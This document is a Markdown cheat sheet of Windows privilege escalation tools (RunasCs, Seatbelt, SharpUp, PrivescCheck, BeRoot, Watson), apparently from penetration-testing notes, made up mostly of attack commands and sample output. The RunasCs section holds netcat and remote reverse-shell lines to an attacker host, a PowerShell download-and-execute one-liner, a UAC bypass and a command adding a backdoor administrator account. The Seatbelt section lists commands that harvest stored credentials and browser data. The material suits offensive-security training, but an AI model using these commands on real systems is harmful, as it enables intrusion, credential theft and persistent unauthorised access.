# Windows Privilege Escalation Tools

## Table of Contents

- [RunasCs](#runascs)
- [Seatbelt](#seatbelt)
- [SharpUp](#sharpup)
- [PrivescCheck](#privesccheck)
- [BeRoot](#beroot)
- [Watson](#watson)

---

## RunasCs

> <https://github.com/antonioCoco/RunasCs>

RunasCs is a utility to run commands with different user credentials. Works even when logon type 2 (interactive) is not allowed.

### Download

```powershell
# Transfer to target
curl http://$lhost/RunasCs.exe -o RunasCs.exe
```

### Basic Usage

> Run command as another user

```cmd
RunasCs.exe $username $password "cmd /c whoami"
```

> Run with domain user

```cmd
RunasCs.exe $username $password "cmd /c whoami" -d $domain
```

> Interactive cmd shell

```cmd
RunasCs.exe $username $password cmd.exe
```

### Logon Types

| Type | Flag | Description |
| :--- | :--- | :--- |
| 2 | (default) | Interactive |
| 3 | `-l 3` | Network |
| 8 | `-l 8` | NetworkCleartext |
| 9 | `-l 9` | NewCredentials (runas /netonly) |

> Using network logon type

```cmd
RunasCs.exe $username $password "cmd /c dir \\\\dc01\\c$" -l 9
```

### Reverse Shell

> Execute reverse shell as user

```cmd
RunasCs.exe $username $password "powershell -e $base64_payload"
```

> With nc

```cmd
RunasCs.exe $username $password "C:\temp\nc.exe $lhost $lport -e cmd.exe"
```

### Remote Connection

> Create session with remote target

```cmd
RunasCs.exe $username $password cmd.exe -r $lhost:$lport
```

> Bypass UAC

```cmd
RunasCs.exe $username $password cmd.exe -r $lhost:$lport --bypass-uac
```

### Examples

> Run as local admin

```cmd
RunasCs.exe Administrator "P@ssw0rd!" "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
```

> Domain authentication

```cmd
RunasCs.exe john.doe "Password123" "powershell -ep bypass -c IEX(IWR http://$lhost/shell.ps1)" -d CORP
```

---

## Seatbelt

> <https://github.com/GhostPack/Seatbelt>

Seatbelt is a C# project that performs security-oriented host reconnaissance.

### Seatbelt Basic Usage

> Run all checks

```cmd
Seatbelt.exe -group=all
```

> Run specific group

```cmd
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=misc
```

### Common Checks

> Credential hunting

```cmd
Seatbelt.exe CredEnum
Seatbelt.exe CredentialManager
Seatbelt.exe CloudCredentials
Seatbelt.exe KeePass
Seatbelt.exe SecPackageCreds
```

> Browser data

```cmd
Seatbelt.exe ChromiumBookmarks
Seatbelt.exe ChromiumHistory
Seatbelt.exe FirefoxHistory
Seatbelt.exe InternetExplorerFavorites
```

> Windows credentials

```cmd
Seatbelt.exe WindowsCredentialFiles
Seatbelt.exe WindowsVault
Seatbelt.exe PuttyHostKeys
Seatbelt.exe PuttySessions
Seatbelt.exe RDPSavedConnections
```

> System info

```cmd
Seatbelt.exe OSInfo
Seatbelt.exe PowerShellHistory
Seatbelt.exe RecentFiles
Seatbelt.exe ScheduledTasks
Seatbelt.exe Services
```

> Security settings

```cmd
Seatbelt.exe AuditSettings
Seatbelt.exe PoweredOnEvents
Seatbelt.exe SysmonConfig
Seatbelt.exe UAC
Seatbelt.exe AntiVirus
```

### Output Options

> Output to file

```cmd
Seatbelt.exe -group=all -outputfile=C:\temp\seatbelt.txt
```

> Full output

```cmd
Seatbelt.exe -group=all -full
```

---

## SharpUp

> <https://github.com/GhostPack/SharpUp>

SharpUp is a C# port of PowerUp, focusing on privilege escalation checks.

### SharpUp Basic Usage

> Run all checks

```cmd
SharpUp.exe
```

> Audit mode (all checks regardless of admin status)

```cmd
SharpUp.exe audit
```

### Specific Checks

> Service-based escalation

```cmd
SharpUp.exe ModifiableServices
SharpUp.exe ModifiableServiceBinaries
SharpUp.exe UnquotedServicePath
```

> Registry-based

```cmd
SharpUp.exe AlwaysInstallElevated
SharpUp.exe ModifiableRegistryAutoRun
```

> Scheduled tasks

```cmd
SharpUp.exe ModifiableScheduledTask
```

> Cached credentials

```cmd
SharpUp.exe CachedGPPPassword
```

> Hijacking

```cmd
SharpUp.exe HijackablePaths
SharpUp.exe ProcessDLLHijack
```

### Output

```cmd
=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

=== Modifiable Services ===
Service: VulnService
  StartName: LocalSystem
  Permissions: ChangeConfig, Start, Stop

=== Unquoted Service Paths ===
Service: BadService
  Binary Path: C:\Program Files\Vuln App\service.exe
```

---

## PrivescCheck

> <https://github.com/itm4n/PrivescCheck>

### Usage

```powershell
# Import
. .\PrivescCheck.ps1

# Run all checks
Invoke-PrivescCheck

# Extended checks
Invoke-PrivescCheck -Extended

# Export report
Invoke-PrivescCheck -Report PrivescCheck -Format HTML
Invoke-PrivescCheck -Report PrivescCheck -Format CSV
```

### Specific Categories

```powershell
# Only credentials
Invoke-PrivescCheck -Credential

# Only services
Invoke-PrivescCheck -Service

# Only scheduled tasks
Invoke-PrivescCheck -ScheduledTask
```

---

## BeRoot

> <https://github.com/AlessandroZ/BeRoot>

### BeRoot Usage

```cmd
# Windows
beRoot.exe

# Check specific module
beRoot.exe --list
```

---

## Watson

> <https://github.com/rasta-mouse/Watson>

Watson is a .NET tool for finding privilege escalation vulnerabilities via missing patches.

### Watson Usage

```cmd
Watson.exe
```

### Output Example

```text
[*] OS Build Number: 17763
[*] Enumerating installed KBs...

[!] CVE-2019-1405 : VULNERABLE
[>] https://www.exploit-db.com/exploits/47684

[!] CVE-2019-1322 : VULNERABLE
[>] https://www.exploit-db.com/exploits/47496
```

---

## Quick Reference

### Tool Selection

| Task | Tool |
| :--- | :--- |
| Run command as another user | RunasCs |
| General enumeration | Seatbelt |
| Privesc checks | SharpUp, PrivescCheck |
| Missing patches | Watson |
| Credential hunting | Seatbelt |

### Common Workflow

```cmd
# 1. Quick privesc check
SharpUp.exe audit

# 2. Detailed enumeration
Seatbelt.exe -group=all

# 3. Check for missing patches
Watson.exe

# 4. If found credentials, use RunasCs
RunasCs.exe admin "P@ssword" cmd.exe
```

### File Locations

```text
# Transfer tools
C:\Users\Public\
C:\Windows\Temp\
C:\Windows\Tasks\
%TEMP%
```

---

## ðŸ“š See Also

### Related Privilege Escalation

- **[Privilege Escalation Windows](4.1.Privilege-Escalation-Windows.md)** - Complete Windows privesc methodology
- **[Potato Exploits](4.5.Potato-Exploits.md)** - Token impersonation (JuicyPotato, PrintSpoofer, GodPotato)
- **[LOLBAS Windows](4.4.LOLBAS-Windows.md)** - Native Windows binary abuse

### Related Topics

- **[Windows Command](../6.OS-Command/6.1.Windows-command.md)** - Windows enumeration commands
- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - Credential attacks after enumeration
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Post-exploitation movement
